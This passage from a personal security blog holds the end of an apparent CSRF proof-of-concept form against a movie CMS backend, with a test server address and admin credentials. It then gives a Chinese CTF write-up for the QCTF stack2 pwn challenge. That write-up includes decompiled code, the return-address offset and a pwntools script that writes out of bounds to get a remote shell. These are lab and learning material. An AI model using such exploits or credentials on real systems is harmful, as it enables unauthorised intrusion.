class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;note"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tags"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select3"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publishyear"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select2"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;lang"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select1"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publisharea"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select4"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;ver"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;hit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;monthhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;weekhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;dayhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;len"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;total"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;nickname"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;company"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tvs"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;douban"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;mtime"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;imdb"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;score"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;scorenum"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;longtxt"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;money"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;psd"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>you can test this vul at <code>http://111.230.11.248:10089/backend/</code>,and the username and password is admin|admin.</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html" itemprop="url">
                  pwn的初体验-qctf Xman-stack2 writeup
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-07-15 22:55:05" itemprop="dateCreated datePublished" datetime="2018-07-15T22:55:05+08:00">2018-07-15</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>昨天去打了打QCTF，水了3道web题目后便草草收场。表示这场比赛真的只是一场萌新赛吗。。。。由于队伍里面向来缺pwn手，所以便计划把这场比赛的pwn题目也做一下练练手，限于水平太菜也就做了个stack2这道题。</p>
</blockquote>
<h2 id="分析程序利用点"><a href="#分析程序利用点" class="headerlink" title="分析程序利用点"></a>分析程序利用点</h2><p>首先 checksec查看程序的保护情况<br><img src="http://p7lc13qga.bkt.clouddn.com/checksec.png" alt="checksec"><br>可以卡暗道开启了栈不可执行保护和CANARY。<br>先把程序拖到IDA里面然后F5大法好。。。得到main函数的伪代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分析程序可以看出程序的逻辑大体是输入一堆数，然后可以求平均值，也可以添加数字，或者更改某一位。数字默认被存入一个数组中。其中在更改某一位数字的操作中可以看到并没有被传入的下标做检测，这就导致了我们可以在任意位置写入数据，从而更改掉main函数的返回地址从而实现getshell。而且这里存在一个hackhere函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以最初的尝试是将retaddr覆盖为hackhere函数的地址。</p>
<h2 id="分析偏移量"><a href="#分析偏移量" class="headerlink" title="分析偏移量"></a>分析偏移量</h2><p>这里分析偏移量采用了ida动态调试的方法，在main函数的retn处下断点。为了方便找到数组的地址，在调试时先输入4个数字1,2,3,4，然后在stack view中寻找数组的首地址。<br>执行到断点处stack view视图默认指向esp的位置，可以从而确定retaddr：<br><img src="http://p7lc13qga.bkt.clouddn.com/retaddr.png" alt="retaddr"><br>这里的retaddr为<code>0xffcd968c</code><br>向上寻找看是否存在某段内容为04030201，即可找到v13数组的首地址：<br><img src="http://p7lc13qga.bkt.clouddn.com/bufaddr.png" alt="bufaddr"><br>可以看到数组地址为<code>0xffcd9608</code>,数组相对retaddr的偏移位数为<code>0xffcd968c-0xffcd9608=132</code>,所以只要覆盖v13[132]至v13[135]即可。<br>确定hackhere的地址为<code>0x0804859B</code>,所以只需覆盖v13[132]至v13[135]为<code>0x9b</code>,<code>0x85</code>,<code>0x04</code>,<code>0x08</code>.<br>本地测试用这样的方法可成功getshell。</p>
<h2 id="远程的问题"><a href="#远程的问题" class="headerlink" title="远程的问题"></a>远程的问题</h2><p>然而远程测试则提示bash not found.原来目标机器上并不存在bash。因此想要getshell就只能通过调用_system来实现最终的getshell。而这里的<code>/bin/sh</code>可以从<code>/bin/bash</code>中获得，即<code>/bin/bash</code>的倒数二位。<br>因此最后打通远端服务器的payload为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"47.96.239.28"</span>, <span class="string">'2333'</span>)</span><br><span class="line">r.sendline(<span class="string">'1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8\n3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8'</span>)</span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://p7lc13qga.bkt.clouddn.com/getshell.png" alt="getshell"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对于pwn菜鸡来说一定要熟悉程序执行的原理才行，另外ida远程调试也是一个很好的办法，更加形象化。另外这里的ida是在wine下运行的portable版本，亲测没有什么大bug。<br>keep calm and carry on！</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
            
              <p class="site-author-name" itemprop="name">Imagemlt</p>
              <p class="site-description motion-element" itemprop="description">personal blog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">55</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">15</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">11</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Imagemlt</span>

  

  
</div>


  



  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>

Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>

  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>




  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
  <script>
    if (window.mermaid) {
//alert("mermaid!!!");
      mermaid.initialize({theme: 'forest'});
    }
  </script>


        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



	





  





  










  





  

  

  

  

  
  

  

  

  

  

  

</body>
</html>
